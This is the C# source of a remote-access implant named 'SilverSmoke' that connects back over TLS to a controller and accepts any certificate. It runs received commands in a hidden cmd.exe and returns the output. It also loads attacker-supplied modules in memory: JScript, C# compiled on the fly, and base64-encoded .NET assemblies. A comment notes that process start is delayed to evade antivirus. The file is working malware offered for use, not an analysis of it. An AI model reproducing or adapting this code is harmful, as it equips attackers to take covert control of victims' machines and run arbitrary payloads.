using Microsoft.ClearScript;
using Microsoft.ClearScript.Windows;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
namespace SilverSmoke
{
    public static class Program
    {
        static StreamWriter streamWriter;
        static StringBuilder bld;
        public static void InitMethod()
        {
            string host = "127.0.0.1";
            int port = 443;
            bld = new StringBuilder();

            using (TcpClient client = new TcpClient(host, port)) //establish basic TCP connection
            {
                using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null)) //wrap conn as SslStream
                {
                    stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false); //Authenticate with the server (SSL)
                    using (StreamReader rdr = new StreamReader(stream)) //Create a reader for the SslStream
                    {
                        streamWriter = new StreamWriter(stream); //Create a writer for the SslStream
                        streamWriter.AutoFlush = true;

                        //Initialize cmd process, but don't run it yet (AV doesn't like programs spawning random processes immediatley)
                        Process p = new Process();
                        p.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(outh);
                        p.ErrorDataReceived += new DataReceivedEventHandler(errh);

                        bool ModuleCode = false;
                        while (true)
                        {
                            var data = rdr.ReadLine(); //read from conn
                            if (data != "//MODULE-END" && !(data.StartsWith("!")) && ModuleCode) //parse input: shell command or module src?
                            {
                                bld.Append(data);
                            }
                            else if (data.StartsWith("!"))
                            {
                                try
                                {
                                    p.StandardInput.WriteLine(data.Substring(1)); //send to cmd.exe
                                }
                                catch (System.InvalidOperationException e)
                                {
                                    //catch if cmd.exe is not started, and start it.
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    p.BeginErrorReadLine();
                                    p.StandardInput.WriteLine(data.Substring(1));
                                }

                            }
                            else if (data == "//MODULE-END")
                            {
                                ModuleCode = false;
                                LoadAndExec(bld.ToString(), rdr);


                            }
                            else if (data == "//MODULE-START")
                            {
                                ModuleCode = true;
                            }
                        }
                    }
                }
            }
        }
        static void Main()
        {
            while (true)
            {
                try
                {
                    InitMethod();
                }
                catch (Exception)
                {
                    Thread.Sleep(100);
                }
            }
        }
        public static int LoadAndExec(String code, StreamReader rdr)
        {
            var lines = code.Split('\n');
            switch (lines[0])
            {
                case "//CLEARSCRIPT":
                    JScriptEngine jsEngine = new JScriptEngine();
                    jsEngine.AddHostType("Console", typeof(Console));
                    jsEngine.AddHostObject("sw", streamWriter);
                    jsEngine.AddHostObject("rdr", rdr);
                    jsEngine.AddHostObject("xHost", new ExtendedHostFunctions());
                    var typeCollection = new HostTypeCollection("mscorlib", "System", "System.Core");
                    jsEngine.AddHostObject("clr", typeCollection);
                    try
                    {
                        jsEngine.Execute(code);
                    }
                    catch (Exception ex)
                    {
                        streamWriter.WriteLine(ex.Message);
                    }
                    break;
                case "//C#":
                    TextWriter oldOut = Console.Out; //save this
                    Console.SetOut(streamWriter);
                    string[] dlls = lines[1].Substring(2).Split(','); //2nd line: list of DLLs, seperated by commas
                    string nm = lines[2].Substring(2); //3rd line: namespace
                    string cls = lines[3].Substring(2); //4th line: class name
                    string mthd = lines[5].Substring(2); //5th line: method name
                    string[] argl = lines[4].Substring(2).Split(' '); //5th line: arguments for method
                    compileInMemory(code, dlls, nm, cls, mthd, argl);
                    Console.SetOut(oldOut);
                    break;
                case "//IL-DATA":
                    nm = lines[1].Substring(2); //2nd line: namespace
                    cls = lines[2].Substring(2); //3rd line: class name
                    mthd = lines[3].Substring(2); //4th line: method name
                    argl = lines[4].Substring(2).Split(' '); //5th line: arguments for method
                    byte[] data = Convert.FromBase64String(lines[6]); //7th line: b64 encoded assembly
                    try
                    {
                        oldOut = Console.Out; //save this
                        Console.SetOut(streamWriter);
                        Assembly asm = Assembly.Load(data);
                        Type type = asm.GetType(nm + "." + cls);
                        MethodInfo method = type.GetMethod(mthd);
                        ParameterInfo[] parameters = method.GetParameters();
                        object[] parametersArray = new object[] { argl };
                        method.Invoke(null, parameters.Length == 0 ? null : parametersArray);
                        Console.SetOut(oldOut);
                    }
                    catch (Exception e)
                    {
                        streamWriter.WriteLine("Error Loading IL Assembly:");
                        streamWriter.WriteLine(e.Message);
                    }
                    break;
                default:
                    streamWriter.WriteLine("[-] Invalid module format.");
                    break;
            }
            bld.Remove(0, bld.Length);
            bld.Clear();
            streamWriter.WriteLine("SIGNAL-MODULE-FINISHED");
            return 0;
        }
        public static void compileInMemory(string code, string[] dlls, string namespc, string clss, string method, string[] argl)
        {
            CompilerParameters compilerParameters = new CompilerParameters();
            compilerParameters.GenerateInMemory = true;
            compilerParameters.TreatWarningsAsErrors = false;
            compilerParameters.GenerateExecutable = false;
            compilerParameters.CompilerOptions = "/optimize";
            compilerParameters.ReferencedAssemblies.AddRange(dlls);
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);
            StringBuilder errBuilder = new StringBuilder();
            if (compilerResults.Errors.HasErrors)
            {
                string text = "Compile error: ";
                foreach (CompilerError compilerError in compilerResults.Errors)
                {
                    errBuilder.Append("\r\n" + compilerError.ToString());
                }
                streamWriter.WriteLine(errBuilder.ToString());
                errBuilder.Remove(0, errBuilder.Length);
                errBuilder.Clear();
            }
            Module module = compilerResults.CompiledAssembly.GetModules()[0];
            Type type = null;
            MethodInfo methodInfo = null;
            if (module != null)
            {
                type = module.GetType(namespc + "." + clss);
            }
            else
            {
                streamWriter.WriteLine("Could not get Module");
            }
            if (type != null)
            {
                methodInfo = type.GetMethod(method);
            }
            else
            {
                streamWriter.WriteLine("Could not get Namespace/Type: " + namespc + "." + clss);
            }
            if (methodInfo != null)
            {
                try
                {
                    object[] parametersArray = new object[] { argl };
                    ParameterInfo[] parameters = methodInfo.GetParameters();
                    methodInfo.Invoke(null, parameters.Length == 0 ? null : parametersArray);
                }
                catch (Exception e)
                {
                    streamWriter.WriteLine(e.Message);
                }

            }
            else
            {
                streamWriter.WriteLine("Could not get Method: " + method);
            }
        }
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            // 1000% correct way of validating the cert.
            return true;
        }

        private static void outh(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception e) { streamWriter.WriteLine("[-] Error: " + e.Message); }
            }
        }

        private static void errh(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception e) { streamWriter.WriteLine("[-] Error: " + e.Message); }
            }
        }
    }
}
